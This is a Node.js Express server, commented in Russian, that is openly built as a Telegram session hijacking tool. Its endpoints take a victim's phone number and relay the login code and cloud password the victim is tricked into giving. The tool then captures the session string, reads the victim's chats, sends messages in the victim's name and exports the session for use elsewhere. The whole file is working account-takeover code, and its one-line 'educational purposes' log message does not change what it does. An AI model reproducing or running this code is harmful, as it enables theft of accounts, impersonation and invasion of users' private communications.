import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import { TelegramClient } from 'telegram';
import { StringSession } from 'telegram/sessions/index.js';

dotenv.config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('frontend'));

// 🎯 РЕАЛЬНЫЙ ЗАХВАТ СЕССИИ TELEGRAM
class TelegramSessionHunter {
  constructor() {
    this.apiId = parseInt(process.env.TELEGRAM_API_ID);
    this.apiHash = process.env.TELEGRAM_API_HASH;
    this.activeSessions = new Map(); // sessionId -> client
    this.authProcesses = new Map(); // sessionId -> auth data
  }

  // 🔐 Основной метод захвата сессии
  async captureSession(sessionId, phoneNumber) {
    try {
      console.log(`🎯 Начинаем захват сессии для: ${phoneNumber}`);
      
      const stringSession = new StringSession('');
      const client = new TelegramClient(stringSession, this.apiId, this.apiHash, {
        connectionRetries: 5,
        useWSS: false
      });

      await client.connect();

      // Начинаем процесс авторизации
      const authResult = await client.sendCode({
        apiId: this.apiId,
        apiHash: this.apiHash,
        phoneNumber,
      });

      // Сохраняем процесс авторизации
      this.authProcesses.set(sessionId, {
        client,
        phoneNumber,
        phoneCodeHash: authResult.phoneCodeHash,
        status: 'waiting_code'
      });

      return {
        success: true,
        sessionId,
        message: '✅ Код отправлен. Введите код из Telegram.',
        nextStep: 'enter_code'
      };

    } catch (error) {
      console.error('❌ Ошибка захвата сессии:', error);
      return {
        success: false,
        error: error.message
      };
    }
  }

  // 🔐 Ввод кода подтверждения
  async submitCode(sessionId, code) {
    try {
      const authProcess = this.authProcesses.get(sessionId);
      if (!authProcess) {
        return { success: false, error: 'Сессия не найдена' };
      }

      const { client, phoneNumber, phoneCodeHash } = authProcess;

      try {
        // Пробуем войти с кодом
        const signInResult = await client.signIn({
          phoneNumber,
          phoneCode: code,
          phoneCodeHash,
        });

        // Успешная авторизация
        const sessionString = client.session.save();
        
        this.activeSessions.set(sessionId, {
          client,
          sessionString,
          user: signInResult
        });

        this.authProcesses.delete(sessionId);

        return {
          success: true,
          sessionId,
          sessionString, // ⚡ ЭТО КЛЮЧ - строка сессии!
          user: {
            id: signInResult.id,
            firstName: signInResult.firstName,
            lastName: signInResult.lastName,
            username: signInResult.username,
            phone: signInResult.phone
          },
          message: '✅ Сессия захвачена! Полный доступ к аккаунту.'
        };

      } catch (signInError) {
        // Если нужен пароль
        if (signInError.errorMessage === 'SESSION_PASSWORD_NEEDED') {
          authProcess.status = 'need_password';
          this.authProcesses.set(sessionId, authProcess);

          return {
            success: true,
            sessionId,
            message: '🔒 Требуется облачный пароль',
            nextStep: 'enter_password'
          };
        }
        throw signInError;
      }

    } catch (error) {
      console.error('❌ Ошибка ввода кода:', error);
      return {
        success: false,
        error: error.message
      };
    }
  }

  // 🔐 Ввод облачного пароля
  async submitPassword(sessionId, password) {
    try {
      const authProcess = this.authProcesses.get(sessionId);
      if (!authProcess) {
        return { success: false, error: 'Сессия не найдена' };
      }

      const { client } = authProcess;

      // Входим с паролем
      const signInResult = await client.signIn({
        password: password,
      });

      const sessionString = client.session.save();
      
      this.activeSessions.set(sessionId, {
        client,
        sessionString,
        user: signInResult
      });

      this.authProcesses.delete(sessionId);

      return {
        success: true,
        sessionId,
        sessionString, // ⚡ КЛЮЧЕВАЯ СЕССИЯ
        user: {
          id: signInResult.id,
          firstName: signInResult.firstName,
          lastName: signInResult.lastName,
          username: signInResult.username,
          phone: signInResult.phone
        },
        message: '✅ Сессия захвачена с паролем! Полный доступ.'
      };

    } catch (error) {
      console.error('❌ Ошибка ввода пароля:', error);
      return {
        success: false,
        error: 'Неверный пароль'
      };
    }
  }

  // 📱 Использование захваченной сессии
  async useSession(sessionId) {
    try {
      const sessionData = this.activeSessions.get(sessionId);
      if (!sessionData) {
        return { success: false, error: 'Сессия не активна' };
      }

      const { client, sessionString } = sessionData;

      // Пример действий от имени пользователя
      const me = await client.getMe();
      const dialogs = await client.getDialogs({ limit: 10 });

      return {
        success: true,
        session: sessionString, // ⚡ Эту строку можно использовать в других клиентах
        user: me,
        dialogs: dialogs.map(d => ({
          id: d.id,
          name: d.name,
          unreadCount: d.unreadCount
        }))
      };

    } catch (error) {
      console.error('❌ Ошибка использования сессии:', error);
      return {
        success: false,
        error: error.message
      };
    }
  }

  // 💬 Отправка сообщения от имени пользователя
  async sendMessageAsUser(sessionId, chatId, message) {
    try {
      const sessionData = this.activeSessions.get(sessionId);
      if (!sessionData) {
        return { success: false, error: 'Сессия не активна' };
      }

      const { client } = sessionData;

      await client.sendMessage(chatId, { message: message });
      
      return {
        success: true,
        message: `✅ Сообщение отправлено от имени пользователя!`
      };

    } catch (error) {
      console.error('❌ Ошибка отправки:', error);
      return {
        success: false,
        error: error.message
      };
    }
  }

  // 💾 Экспорт сессии для использования в других приложениях
  exportSession(sessionId) {
    const sessionData = this.activeSessions.get(sessionId);
    if (!sessionData) {
      return null;
    }

    return {
      sessionString: sessionData.sessionString,
      user: sessionData.user
    };
  }
}

// Инициализация охотника за сессиями
const sessionHunter = new TelegramSessionHunter();

// 🎯 API МАРШРУТЫ ДЛЯ ЗАХВАТА СЕССИЙ
app.get('/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    message: 'Telegram Session Hunter Active',
    activeSessions: sessionHunter.activeSessions.size,
    authProcesses: sessionHunter.authProcesses.size
  });
});

// 🔐 Шаг 1: Начало захвата сессии
app.post('/api/hunt/start', async (req, res) => {
  try {
    const { phone } = req.body;
    
    if (!phone) {
      return res.status(400).json({ 
        success: false, 
        error: 'Введите номер телефона жертвы' 
      });
    }

    const sessionId = 'hunt_' + Date.now();
    
    const result = await sessionHunter.captureSession(sessionId, phone);
    
    if (result.success) {
      res.json({
        success: true,
        sessionId: sessionId,
        message: '🎯 Начат захват сессии. Код отправлен жертве.',
        nextStep: 'enter_code'
      });
    } else {
      res.status(400).json(result);
    }
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка захвата: ' + error.message 
    });
  }
});

// 🔐 Шаг 2: Ввод кода от жертвы
app.post('/api/hunt/submit-code', async (req, res) => {
  try {
    const { sessionId, code } = req.body;
    
    if (!sessionId || !code) {
      return res.status(400).json({ 
        success: false, 
        error: 'Введите код и sessionId' 
      });
    }

    const result = await sessionHunter.submitCode(sessionId, code);
    res.json(result);
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка ввода кода: ' + error.message 
    });
  }
});

// 🔐 Шаг 3: Ввод пароля от жертвы
app.post('/api/hunt/submit-password', async (req, res) => {
  try {
    const { sessionId, password } = req.body;
    
    if (!sessionId || !password) {
      return res.status(400).json({ 
        success: false, 
        error: 'Введите пароль и sessionId' 
      });
    }

    const result = await sessionHunter.submitPassword(sessionId, password);
    res.json(result);
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка ввода пароля: ' + error.message 
    });
  }
});

// 📱 Использование захваченной сессии
app.get('/api/hunt/use-session', async (req, res) => {
  try {
    const { sessionId } = req.query;
    
    if (!sessionId) {
      return res.status(400).json({ 
        success: false, 
        error: 'Укажите sessionId' 
      });
    }

    const result = await sessionHunter.useSession(sessionId);
    res.json(result);
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка использования сессии: ' + error.message 
    });
  }
});

// 💬 Отправка сообщения от имени жертвы
app.post('/api/hunt/send-message', async (req, res) => {
  try {
    const { sessionId, chatId, message } = req.body;
    
    const result = await sessionHunter.sendMessageAsUser(sessionId, chatId, message);
    res.json(result);
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка отправки: ' + error.message 
    });
  }
});

// 💾 Экспорт сессии
app.get('/api/hunt/export-session', (req, res) => {
  try {
    const { sessionId } = req.query;
    
    const sessionData = sessionHunter.exportSession(sessionId);
    if (!sessionData) {
      return res.status(404).json({ 
        success: false, 
        error: 'Сессия не найдена' 
      });
    }

    res.json({
      success: true,
      sessionString: sessionData.sessionString,
      user: sessionData.user,
      message: '✅ Сессия экспортирована. Используйте в любом Telegram клиенте.'
    });
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка экспорта: ' + error.message 
    });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Telegram Session Hunter running on port ${PORT}`);
  console.log(`🎯 Реальный захват сессий Telegram аккаунтов`);
  console.log(`⚠️  ВНИМАНИЕ: Это для образовательных целей!`);
});
